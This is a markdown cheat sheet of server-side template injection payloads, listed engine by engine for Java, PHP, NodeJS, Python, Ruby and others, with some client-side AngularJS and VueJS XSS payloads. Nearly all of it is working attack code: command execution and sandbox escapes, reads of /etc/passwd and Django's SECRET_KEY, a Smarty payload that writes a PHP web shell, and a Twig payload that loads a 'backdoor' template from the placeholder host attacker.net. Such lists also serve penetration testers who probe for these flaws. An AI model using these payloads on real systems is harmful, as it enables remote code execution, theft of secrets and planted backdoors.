# SSTI

## Testing for SSTI

Try submitting a fuzzed payload such as `${{<%[%'"}}%\` if a stack trace error is displayed then the application is vulnerable.

To distinguish between XSS and SSTI submit payloads that trigger mathematical operations such as `${2*2}` if the output is 4 then the vulnerability is aa SSTI

If the user input is included inside a code block follow these steps

1. Verify that the attack is not an XSS by passing a payload including HTML tags such as `str<b>test</b>` if the tags and the content included are not rendered then the vulnerability is not an XSS
2. Try to escape from the code block by submitting a payload as follow (adjust based on the engine's syntax): `}}<b>test</b>`
3. If the content of the code block is rendered correctly alongside the injected tags then the application is vulnerable to SSTI

## Engine identification

### Java

#### Identification

```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
```

#### Command execution

```
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
```

#### Get system variables

```
${T(java.lang.System).getenv()}
```

### Java - FreeMarker

#### Identification

```
${7*7}
#{7*7}
```

#### Command execution

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("<cmd>")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('<cmd>')}
${"freemarker.template.utility.Execute"?new()("<cmd>")}
```

#### File read

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('<path>').toURL().openStream().readAllBytes()?join(" ")}
```

#### Sandbox escape

requires FreeMarker version < 2.3.30

```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("<cmd>")}
```

### Java - Velocity

#### Identification

```
$class.type
$class.inspect("java.lang.Runtime").type
```

#### Blind command execution

```
$ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("<cmd>")
```

#### Command execution

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("<cmd>"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### Java - Thymeleaf

#### Identification

```
${7*7}
[[${7*7}]]
[(${7*7})]
```

#### Command execution

```
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("<cmd>")}
```

### Java - Pebble

#### Identification

```
{{ someString.toUPPERCASE() }}
```

#### Command execution

Version < 3.0.9

```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('<cmd>') }}
```

Newer versions

```
{% raw %}
{% set cmd = '<cmd>' %}
{% endraw %}

{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

### Java - JinJava

#### Identification

```
{{'a'.toUpperCase()}} would result in 'A'
{{ request }}
```

#### Command execution

```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('<cmd>')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"<cmd>\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"<cmd>\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"<cmd>\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
#command with arguments
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"<cmd>\\\",\\\"<first arg>\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

### PHP - Smarty

#### Identification

```
{$smarty.version}
```

#### Command execution

```
{php}echo `<cmd>`;{/php}
{system('<cmd>')}
```

### PHP - Twig

#### Identification

```
{{7*7}}
{{7*'7'}}
{{_self}}
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

#### Command execution

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("<cmd>")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<cmd>")}}
{{['<cmd>']|filter('system')}}
```

#### File read

```
"{{'<file path>'|file_excerpt(1,30)}}"@
```

#### Remote file inclusion

```
{{_self.env.setCache("ftp://<url>")}}{{_self.env.loadTemplate("<template name>")}}
{{_self.env.setCache("http://<url>")}}{{_self.env.loadTemplate("<template name>")}}
```

### NodeJS

#### Code execution via handlebars

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Code execution via JsRenderer

```
{{:"a".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('<cmd>').toString()")()}}
```

#### XSS via JsRenderer

```
{{:%22a%22.toString.constructor.call({},%22<XSS payload>%22)()}}
```

## Client Side Payloads

### AngularJS

```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}

<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

### VueJS

```
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
{{_openBlock.constructor('alert(1)')()}}     //V3
{{constructor.constructor('alert(1)')()}}    //V2
```

### Mavo

```
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
```

## Server Side Payloads

### FreeMarker - java

```
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```

### Java

```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Twig - PHP

```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

### Smarty - PHP

```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Handlebars - NodeJs

```
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
```

### Velocity

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### ERB - Ruby

```
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### Django - Python

```
{% raw %}
{% debug %}
{% endraw %}
{{settings.SECRET_KEY}}
```

### Tornado - Python

```
{% raw %}
{% import foobar %} = Error
{% import os %}
{% endraw %}{{os.system('whoami')}}
```

### Mojolicious - Perl

```
<%= perl code %>
<% perl code %>
```

### Flask/Jinja2

```
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{% raw %}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{% endraw %}

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

### Jade

```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

### Razor - .Net

```
@(1+2)
@{// C# code}
```



